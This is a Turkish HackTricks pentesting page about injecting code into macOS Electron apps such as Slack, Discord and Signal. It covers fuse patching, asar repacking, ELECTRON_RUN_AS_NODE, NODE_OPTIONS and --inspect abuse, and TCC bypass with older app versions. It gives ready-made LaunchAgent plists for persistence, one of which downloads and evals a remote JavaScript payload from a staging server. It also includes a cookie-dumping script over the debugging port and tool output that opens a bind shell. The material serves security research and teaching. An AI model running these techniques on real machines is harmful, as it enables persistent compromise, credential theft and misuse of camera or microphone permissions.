# macOS Electron Uygulamalarında Enjeksiyon

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

## Temel Bilgiler

Electron nedir bilmiyorsanız, [**burada birçok bilgi bulabilirsiniz**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ancak şimdilik sadece şunu bilin ki Electron **node** çalıştırır.\
Ve node'un bazı **parametreleri** ve **çevresel değişkenleri** vardır ki bunlar, belirtilen dosyanın dışında başka kodları **çalıştırmak için kullanılabilir**.

### Electron Füzyonları

Bu teknikler bir sonraki bölümde tartışılacak olsa da, Electron son zamanlarda bunları **önlemek için birkaç güvenlik bayrağı ekledi**. Bunlar [**Electron Füzyonları**](https://www.electronjs.org/docs/latest/tutorial/fuses) olarak adlandırılır ve bunlar macOS'ta Electron uygulamalarının **keyfi kod yükleme**yi **önlemek** için kullandığı füzyonlardır:

* **`RunAsNode`**: Devre dışı bırakılırsa, kod enjeksiyonu için **`ELECTRON_RUN_AS_NODE`** çevresel değişkeninin kullanımını engeller.
* **`EnableNodeCliInspectArguments`**: Devre dışı bırakılırsa, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmaz. Böylece kod enjeksiyonunu önler.
* **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirilirse, yüklenen **`asar`** **dosyası** macOS tarafından **doğrulanır**. Bu şekilde, bu dosyanın içeriğini değiştirerek kod enjeksiyonunu önler.
* **`OnlyLoadAppFromAsar`**: Bu etkinleştirilirse, yükleme sırasını aramak yerine sadece **`app.asar`**'ı kontrol eder ve kullanır. Bu şekilde, **`embeddedAsarIntegrityValidation`** füzyonuyla birleştirildiğinde doğrulanmamış kodun yüklenmesinin **imkansız** olduğunu garanti eder.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirilirse, tarayıcı işlemi V8 anlık görüntüsü için `browser_v8_context_snapshot.bin` adlı dosyayı kullanır.

Kod enjeksiyonunu önlemeyen başka bir ilginç füzyon:

* **EnableCookieEncryption**: Etkinleştirilirse, diskteki çerez deposu işletim sistemi düzeyinde şifreleme anahtarları kullanılarak şifrelenir.

### Electron Füzyonlarını Kontrol Etme

Bu bayrakları bir uygulamadan **kontrol edebilirsiniz**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Füze Ayarlarını Değiştirme

[**Belgelerde**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode) belirtildiği gibi, **Electron Füze**nin yapılandırması, **Electron ikili** içinde yapılandırılmıştır ve içinde **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** dizesini içeren bir yer bulunur.

MacOS uygulamalarında genellikle `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` içinde bulunur.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Bu dosyayı [https://hexed.it/](https://hexed.it/) adresinde yükleyebilir ve önceki dizeyi arayabilirsiniz. Bu dizeden sonra, her sigortanın devre dışı bırakılmış veya etkinleştirilmiş olduğunu gösteren ASCII'de bir "0" veya "1" numarası görebilirsiniz. Sadece hex kodunu (`0x30` `0` ve `0x31` `1` olarak) **sigorta değerlerini değiştirmek** için değiştirin.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ancak, bu baytları değiştirilmiş olarak bir uygulamanın içindeki **`Electron Framework` ikili** dosyasını **üzerine yazmaya** çalışırsanız, uygulama çalışmayacaktır.

## Electron Uygulamalarına Kod Ekleyerek Uzaktan Kod Çalıştırma (RCE)

Bir Electron Uygulamasının kullandığı **harici JS/HTML dosyaları** olabilir, bu nedenle bir saldırgan bu dosyalara kod enjekte edebilir ve imzası kontrol edilmeyen bu kodu uygulama bağlamında çalıştırabilir.

{% hint style="danger" %}
Ancak, şu anda 2 sınırlama bulunmaktadır:

* Bir Uygulamayı değiştirmek için **`kTCCServiceSystemPolicyAppBundles`** iznine **ihtiyaç** vardır, bu nedenle varsayılan olarak bu artık mümkün değildir.
* Derlenmiş **`asap`** dosyasının genellikle **`embeddedAsarIntegrityValidation`** ve **`onlyLoadAppFromAsar`** sigortaları **etkin** olarak ayarlıdır.

Bu saldırı yolunu daha karmaşık (veya imkansız) hale getirir.
{% endhint %}

**`kTCCServiceSystemPolicyAppBundles`** gereksinimini atlamak mümkündür. Bunun için uygulamayı başka bir dizine (örneğin **`/tmp`**) kopyalayarak, klasörü **`app.app/Contents`** olarak yeniden adlandırarak, **asar** dosyasını **kötü niyetli** kodunuzla değiştirerek, tekrar **`app.app/Contents`** olarak adlandırarak ve çalıştırarak yapabilirsiniz.

Asar dosyasından kodu çıkarabilirsiniz:
```bash
npx asar extract app.asar app-decomp
```
Ve değiştirdikten sonra tekrar paketleyin:
```bash
npx asar pack app-decomp app-new.asar
```
## `ELECTRON_RUN_AS_NODE` ile Uzaktan Kod Çalıştırma (RCE) <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**Belgelere**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) göre, bu çevre değişkeni ayarlandığında, işlem normal bir Node.js işlemi olarak başlatılır.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Eğer **`RunAsNode`** füzesi devre dışı bırakılmışsa, **`ELECTRON_RUN_AS_NODE`** ortam değişkeni görmezden gelinir ve bu çalışmaz.
{% endhint %}

### Uygulama Plist'ten Enjeksiyon

[**Burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kalıcılığı sağlamak için bu ortam değişkenini bir plist içinde kötüye kullanabilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` ile Uzaktan Kod Çalıştırma (RCE)

Payload'ı farklı bir dosyada saklayabilir ve çalıştırabilirsiniz:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Eğer **EnableNodeOptionsEnvironmentVariable** ayarı **devre dışı** bırakılmışsa, uygulama başlatıldığında **NODE_OPTIONS** ortam değişkenini **yoksayacak**, ancak **ELECTRON_RUN_AS_NODE** ortam değişkeni ayarlanmışsa, bu da **yoksayılacak**tır. Eğer **ELECTRON_RUN_AS_NODE** ayarını yapmazsanız, şu hatayı alırsınız: `Paketlenmiş uygulamalarda çoğu NODE_OPTION desteklenmez. Daha fazla ayrıntı için belgelere bakın.`
{% endhint %}

### Uygulama Plist'ten Enjeksiyon

Bu ortam değişkenini bir plist içinde kötüye kullanabilir ve süreklilik sağlayabilirsiniz. Aşağıdaki anahtarları ekleyin:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Denetim yaparak Uzaktan Kod Enjeksiyonu (RCE)

[**Bu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kaynağa göre, Electron uygulamasını **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi bayraklarla çalıştırırsanız, bir **hata ayıklama bağlantı noktası açılacak** ve buna bağlanabileceksiniz (örneğin Chrome'da `chrome://inspect` üzerinden) ve hatta yeni işlemler başlatabileceksiniz.\
Örneğin:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Eğer **`EnableNodeCliInspectArguments`** adlı fuse devre dışı bırakılmışsa, uygulama başlatıldığında **`--inspect`** gibi node parametrelerini **yok sayar**, ancak **`ELECTRON_RUN_AS_NODE`** adlı çevresel değişken ayarlanmışsa, bu da **yok sayılır**. Bu durumda **electron parametresi `--remote-debugging-port=9229`** kullanabilirsiniz, ancak önceki payload diğer işlemleri yürütmek için çalışmayacaktır.
{% endhint %}

Parametre **`--remote-debugging-port=9222`** kullanarak, Electron Uygulamasından **geçmiş** (GET komutlarıyla) veya tarayıcının **çerezlerini** (tarayıcı içinde **şifrelenmiş** oldukları ve onları verecek bir **json uç noktası** olduğu için) çalmak mümkündür.

Bunu [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilir ve otomatik araç [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) veya basit bir betik kullanabilirsiniz:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
[**Bu blog yazısında**](https://hackerone.com/reports/1274695), bu hata ayıklama işlemi, başsız bir chrome'un **keyfi dosyaları keyfi konumlara indirmesini sağlamak için** kötüye kullanılmıştır.

### Uygulama Plist'ten Enjeksiyon

Bu çevre değişkenini bir plist içinde kötüye kullanabilir ve kalıcılığı sağlamak için şu anahtarları ekleyebilirsiniz:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Eski Sürümleri Kullanarak TCC Atlatma

{% hint style="success" %}
macOS'un TCC daemon'ı, uygulamanın çalıştırılan sürümünü kontrol etmez. Bu nedenle, önceki tekniklerle bir Electron uygulamasına kod enjekte edemiyorsanız, bir önceki sürümünü indirip üzerine kod enjekte edebilirsiniz çünkü hala TCC ayrıcalıklarını alacaktır (Trust Cache engellemezse).
{% endhint %}

## JS Kodu Dışında Kod Çalıştırma

Önceki teknikler, **electron uygulamasının işlemi içinde JS kodunu çalıştırmanıza** izin verecektir. Ancak, **çocuk işlemler, ebeveyn uygulama ile aynı kum havuzu profilinde** çalışır ve **TCC izinlerini miras alır**.\
Bu nedenle, örneğin kamera veya mikrofona erişmek için yetkilendirmeleri kötüye kullanmak istiyorsanız, sadece **işlem içinden başka bir ikili çalıştırabilirsiniz**.

## Otomatik Enjeksiyon

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) aracı, kurulu olan zayıf noktalı electron uygulamalarını bulmak ve üzerlerine kod enjekte etmek için kolayca kullanılabilir. Bu araç, **`--inspect`** tekniğini kullanmaya çalışacaktır:

Kendiniz derlemeniz gerekmektedir ve aşağıdaki gibi kullanabilirsiniz:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referanslar

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
